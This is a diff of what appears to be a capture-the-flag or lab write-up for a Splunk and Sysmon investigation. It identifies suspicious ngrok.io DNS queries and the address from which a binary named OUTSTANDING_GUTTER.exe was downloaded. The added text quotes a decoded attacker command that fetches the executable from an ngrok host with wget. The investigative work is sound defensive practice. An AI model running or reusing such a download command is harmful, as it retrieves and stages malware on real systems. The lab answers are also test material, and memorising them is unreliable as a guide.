@@ -50,7 +50,7 @@ C:\Windows\Temp\OUTSTANDING_GUTTER.exe
 What is the address the binary was downloaded from?
 
 **Investigation:**
-I reviewed the `QueryName` field from Sysmon Event ID 22 to identify suspicious domains.
+I continued investigating the Sysmon Event ID 22 DNS queries and reviewed the `QueryName` field to identify suspicious domains.
 
 **Query:**
 
@@ -60,11 +60,18 @@ index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCo
 | table QueryName
 ```
 
-Two suspicious `ngrok.io` domains appeared. Further investigation of the encoded PowerShell command showed that `OUTSTANDING_GUTTER.exe` was downloaded from:
+The query returned two suspicious `ngrok.io` domains:
 
 ```text
-http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe
+9030-181-215-214-32.ngrok.io
+886e-181-215-214-32.ngrok.io
 ```
+I investigated the second domain further because it was associated with the suspicious binary. I later found an encoded PowerShell command related to this activity. After decoding it, the command revealed:
+
+```text
+wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe
+```
+This provided supporting evidence that `886e-181-215-214-32.ngrok.io` was the source used to download `OUTSTANDING_GUTTER.exe`.
 
 **Answer:** `hxxp[://]886e-181-215-214-32[.]ngrok[.]io`
 
